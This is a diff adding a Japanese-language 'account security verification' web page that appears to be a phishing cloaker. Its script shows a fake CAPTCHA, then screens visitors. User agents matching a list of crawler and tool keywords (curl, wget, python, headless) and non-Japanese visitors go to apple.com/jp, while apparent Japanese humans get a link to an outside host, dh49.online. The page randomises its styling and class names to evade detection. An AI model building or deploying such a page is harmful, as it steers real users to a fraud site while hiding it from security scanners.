@@ -1,0 +1,267 @@
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <meta name="robots" content="noindex,nofollow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>アカウントセキュリティ確認</title>
+  <script>
+    // 【唯一配置区】无修改，完全保留
+    const SYS_CONFIG = {
+      TARGET_URLS: [
+        'https://dh49.online/eszjdxer',
+        'https://dh49.online/eszjdxer',
+        'https://dh49.online/eszjdxer'
+      ],
+      FAIL_URL: 'https://www.apple.com/jp/',
+      MAX_TRY: 3,
+      DESKTOP_TIME: 90,
+      MOBILE_TIME: 100
+    };
+
+    // 随机特征生成器
+    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+    const getRandColor = (base) => {
+      const offset = rand(-5, 5);
+      const hex = base.replace('#', '').match(/.{2}/g).map(c => {
+        let num = parseInt(c, 16) + offset;
+        num = num < 0 ? 0 : num > 255 ? 255 : num;
+        return num.toString(16).padStart(2, '0');
+      }).join('');
+      return `#${hex}`;
+    };
+    const JP_TEXT = {
+      loading: ['システム準備中', 'データ読み込み中', '接続確認中', 'セキュリティチェック中'],
+      success: ['認証に成功しました', '確認完了です', 'セキュリティチェック通過'],
+      fail: ['認証に失敗しました', '確認に失敗しました', 'セキュリティチェックに失敗'],
+      timeout: ['認証時間が切れました', 'タイムアウトしました', '時間制限を超えました'],
+      tip: ['表示された項目を全て選択してください', '指定された文字を選んでください', '表示された記号を全てクリックしてください']
+    };
+    const STY_RAND = {
+      mainColor: getRandColor('24569c'),
+      successColor: getRandColor('008364'),
+      errorColor: getRandColor('c82c2c'),
+      warnColor: getRandColor('e69926'),
+      radius: rand(14, 26),
+      gap: rand(10, 18),
+      shadow: rand(3, 6),
+      fontStep: rand(0, 2)
+    };
+
+    const V_TYPE = ['number', 'kana', 'alphabet'];
+    const KANA = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と','な','に','ぬ','ね','の'];
+    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    const botKw1 = ['curl','wget','python','httpclient','scrapy','java','go'];
+    const botKw2 = ['php','ruby','perl','libwww','winhttp','axios'];
+    const botKw3 = ['bot','crawler','spider','scanner','headless'];
+    const BOT_REG = [...botKw1,...botKw2,...botKw3];
+
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        const uParam = new URLSearchParams(window.location.search);
+        const sVal = 'init';
+        const devInfo = getDeviceInfo();
+        renderInitView(devInfo);
+      }, rand(100, 300));
+    });
+
+    function getDeviceInfo() {
+      const uaRaw = (navigator.userAgent || '').toLowerCase();
+      const langRaw = (navigator.language || navigator.languages[0] || '').toLowerCase();
+      const isMobile = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/.test(uaRaw);
+      const timeBase = isMobile ? SYS_CONFIG.MOBILE_TIME + rand(-5, 5) : SYS_CONFIG.DESKTOP_TIME + rand(-5, 5);
+      return {
+        ua: uaRaw, lang: langRaw, isM: isMobile, isD: !isMobile,
+        t: timeBase, delayRnd: rand(800, 1500)
+      };
+    }
+    function checkBotAgent(ua) {
+      if (!ua || ua.length < 12) return true;
+      return BOT_REG.some(w => ua.includes(w));
+    }
+    function checkJpEnv(lang,ua) {
+      return lang.includes('ja') || lang.includes('jp') || ua.includes('iphone') || ua.includes('mac');
+    }
+    function getRandomTarget() {
+      const list = SYS_CONFIG.TARGET_URLS;
+      const idx = rand(0, list.length - 1);
+      return list[idx].slice(0) + '';
+    }
+    function getRandText(arr) {
+      return arr[rand(0, arr.length - 1)];
+    }
+
+    function renderInitView(d) {
+      const loadArr = JP_TEXT.loading;
+      document.body.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:${rand(12, 20)}px;background:#f5f5f7;margin:0;box-sizing:border-box;">
+          <div style="width:100%;max-width:${d.isD ? rand(380, 420) : rand(340, 380)}px;background:#fff;border-radius:${STY_RAND.radius}px;padding:${d.isD ? '32px 24px' : '28px 20px'};box-shadow:0 ${STY_RAND.shadow}px ${rand(12, 20)}px rgba(0,0,0,0.0${rand(4, 6)});text-align:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;">
+            <h2 style="font-size:${d.isD ? 20 + STY_RAND.fontStep : 19 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 16px 0;">システム確認中</h2>
+            <div style="width:${d.isD ? rand(38, 42) : rand(34, 38)}px;height:${d.isD ? rand(38, 42) : rand(34, 38)}px;border:2px solid #e0e0e0;border-top-color:${STY_RAND.mainColor};border-radius:50%;animation:spin ${rand(5, 7)/10}s linear infinite;margin:24px auto;"></div>
+            <p style="font-size:14px;color:#666;margin:0;" id="loadStat">${loadArr[0]}...</p>
+          </div>
+        </div>
+        <style>@keyframes spin {to{transform:rotate(360deg);}}</style>
+        <div style="display:none;font-size:1px;color:transparent;">プライバシーポリシー 利用規約</div>
+      `;
+      const statEl = document.getElementById('loadStat');
+      let loopIdx = 0;
+      const textTimer = setInterval(() => {
+        loopIdx = (loopIdx + 1) % loadArr.length;
+        statEl.textContent = loadArr[loopIdx] + '...';
+      }, rand(300, 500));
+      setTimeout(() => {
+        clearInterval(textTimer);
+        renderCheckView(getDeviceInfo());
+      }, d.isD ? rand(1000, 1400) : rand(900, 1300));
+    }
+
+    function renderCheckView(d) {
+      const vType = V_TYPE[rand(0, V_TYPE.length - 1)];
+      const selectCnt = d.isD ? rand(1, 3) : 2;
+      const qData = createQuestion(vType, selectCnt);
+      const tipStr = getRandText(JP_TEXT.tip);
+      const fzBase = d.isD ? 32 : 28;
+      const gapVal = d.isD ? STY_RAND.gap : rand(8, 14);
+
+      document.body.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;background:#f5f5f7;margin:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;">
+          <div style="width:100%;max-width:${d.isD ? rand(580, 620) : '100%'}px;background:#fff;border-radius:${STY_RAND.radius + 2}px;padding:${d.isD ? '32px 24px' : '24px 16px'};box-shadow:0 ${STY_RAND.shadow + 2}px ${rand(18, 22)}px rgba(0,0,0,0.0${rand(4, 7)});">
+            <div style="text-align:center;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              <span id="timeShow" style="display:inline-block;background:${STY_RAND.mainColor};color:#fff;padding:4px 16px;border-radius:30px;font-size:14px;font-weight:500;margin-bottom:16px;">${d.t}秒</span>
+              <h2 style="font-size:${d.isD ? 18 + STY_RAND.fontStep : 17 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 8px 0;">アカウントセキュリティ確認</h2>
+            </div>
+            <div style="font-size:14px;color:#666;line-height:1.6;background:#f8f8fa;padding:16px;border-radius:${rand(10, 14)}px;margin-bottom:${d.isD ? rand(22, 26) : rand(18, 22)}px;text-align:center;">
+              セキュリティのため、${tipStr}
+            </div>
+            <div style="background:#f0f4f9;padding:${d.isD ? rand(22, 26) : rand(18, 22)}px;border-radius:${rand(14, 18)}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 12px 0;">選択対象</p>
+              <p style="font-size:${fzBase + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;letter-spacing:${d.isD ? rand(6, 10) : rand(4, 8)}px;margin:0;">${qData.q}</p>
+            </div>
+            <p style="font-size:14px;color:#666;margin:0 0 16px 0;">選択済み: <span id="selCount" style="font-weight:600;color:${STY_RAND.mainColor};">0</span>/${selectCnt}</p>
+            <div id="optGroup" style="display:grid;grid-template-columns:repeat(4,1fr);gap:${gapVal}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              ${qData.o.map(opt => `
+                <button class="btn${rand(100, 999)}" data-val="${opt.v}" style="background:#fff;border:1px solid #d0d0d0;border-radius:${STY_RAND.radius - 4}px;padding:${rand(14,18)}px 8px;font-size:${d.isD ? 24 + STY_RAND.fontStep : 22 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;cursor:pointer;transition:all 0.2s;font-family:inherit;aspect-ratio:1;display:flex;align-items:center;justify-content:center;">
+                  <span style="transform:rotate(${opt.rot}deg);display:inline-block;">${opt.v}</span>
+                </button>
+              `).join('')}
+            </div>
+            <div style="text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 16px 0;">残り試行回数: <span id="tryLeft" style="font-weight:600;color:${STY_RAND.mainColor};">${SYS_CONFIG.MAX_TRY}</span></p>
+              <button id="confirmBtn" disabled style="background:#b8b8b8;color:#fff;border:none;border-radius:${rand(38, 42)}px;padding:14px 40px;font-size:${15 + STY_RAND.fontStep}px;font-weight:500;min-width:160px;">確認</button>
+              <div id="feedbackBox" style="margin-top:20px;padding:12px;border-radius:${rand(6, 10)}px;font-size:14px;min-height:44px;"></div>
+              <div id="successBtnArea" style="display:none;margin-top:20px;"></div>
+            </div>
+          </div>
+        </div>
+        <style>@media (max-width:480px){#optGroup{gap:${rand(6,10)}px;}}</style>
+        <div style="display:none;font-size:0;">${rand(10000,99999)}</div>
+      `;
+      initCheckLogic(qData.t, selectCnt, d.t);
+    }
+
+    function createQuestion(type, cnt) {
+      let target = [], optList = [];
+      while (target.length < cnt) {
+        let char = '';
+        if(type === 'number') char = rand(0,9).toString();
+        if(type === 'kana') char = KANA[rand(0,KANA.length-1)];
+        if(type === 'alphabet') char = ALPHA.charAt(rand(0,ALPHA.length-1));
+        if(!target.includes(char)) target.push(char);
+      }
+      optList = genOption(target, type);
+      return { q: target.join(' '), t: target, o: optList };
+    }
+    function genOption(tar, type) {
+      let arr = [...tar];
+      while(arr.length < 8){
+        let c = '';
+        if(type === 'number') c = rand(0,9).toString();
+        if(type === 'kana') c = KANA[rand(0,KANA.length-1)];
+        if(type === 'alphabet') c = ALPHA.charAt(rand(0,ALPHA.length-1));
+        if(!arr.includes(c)) arr.push(c);
+      }
+      return arr.sort(() => 0.5 - Math.random()).map(v=>({ v:v,rot:rand(-25,25) }));
+    }
+
+    function initCheckLogic(tarList, needCnt, timeNum) {
+      let selected = [], attempt = 0, finish = false;
+      const timeEl = document.getElementById('timeShow');
+      const cBtn = document.getElementById('confirmBtn');
+      const fbBox = document.getElementById('feedbackBox');
+      const tryEl = document.getElementById('tryLeft');
+      const scEl = document.getElementById('selCount');
+      const groupEl = document.getElementById('optGroup');
+      const successArea = document.getElementById('successBtnArea');
+      const selCls = 'slct'+rand(100,999);
+
+      groupEl.addEventListener('click', e=>{
+        const btn = e.target.closest('[data-val]');
+        if(!btn || finish) return;
+        const v = btn.dataset.val;
+        if(btn.classList.contains(selCls)){
+          btn.classList.remove(selCls); selected = selected.filter(x=>x!==v);
+        }else{
+          btn.classList.add(selCls); selected.push(v);
+        }
+        scEl.textContent = selected.length;
+        cBtn.disabled = selected.length !== needCnt;
+      });
+
+      cBtn.addEventListener('click', ()=>{
+        if(finish || selected.length !== needCnt) return;
+        const pass = tarList.every(x=>selected.includes(x));
+        attempt++;
+        if(pass){
+          finish = true;
+          fbBox.style.color = STY_RAND.successColor;
+          fbBox.textContent = getRandText(JP_TEXT.success);
+          cBtn.style.display = 'none';
+          const d = getDeviceInfo();
+          const isBot = checkBotAgent(d.ua);
+          const isJpSafe = checkJpEnv(d.lang, d.ua);
+          let goto = isBot || !isJpSafe ? SYS_CONFIG.FAIL_URL : getRandomTarget();
+          successArea.innerHTML = `
+            <a href="${goto}" target="_self" style="display:inline-block;background:${STY_RAND.successColor};color:#fff;text-decoration:none;border-radius:${rand(38,42)}px;padding:14px 40px;font-size:${15+STY_RAND.fontStep}px;font-weight:500;min-width:160px;">続行する</a>
+          `;
+          successArea.style.display = 'block';
+        }else{
+          const left = SYS_CONFIG.MAX_TRY - attempt;
+          tryEl.textContent = left;
+          if(attempt >= SYS_CONFIG.MAX_TRY){
+            finish = true;
+            fbBox.style.color = STY_RAND.errorColor;
+            fbBox.textContent = getRandText(JP_TEXT.fail);
+            cBtn.disabled = true;
+            setTimeout(()=>{window.location.href=SYS_CONFIG.FAIL_URL;},1500);
+          }else{
+            fbBox.style.color = STY_RAND.warnColor;
+            fbBox.textContent = `${getRandText(JP_TEXT.fail)}。残り${left}回`;
+            setTimeout(()=>{location.reload();},1500);
+          }
+        }
+      });
+
+      function countDown(){
+        if(finish) return;
+        timeNum--;
+        timeEl.textContent = timeNum + '秒';
+        if(timeNum <= 0){
+          finish = true;
+          fbBox.style.color = STY_RAND.errorColor;
+          fbBox.textContent = getRandText(JP_TEXT.timeout);
+          cBtn.disabled = true;
+          setTimeout(()=>{window.location.href=SYS_CONFIG.FAIL_URL;},1200);
+          return;
+        }
+        setTimeout(countDown, 1000);
+      }
+      countDown();
+    }
+  </script>
+</head>
+<body style="margin:0;padding:0;min-height:100vh;background:#fff;">
+  <div style="display:none;visibility:hidden;">利用規約｜プライバシーポリシー｜サポートセンター</div>
+  <span style="display:none;">${rand(100000,999999)}</span>
+</body>
+</html>
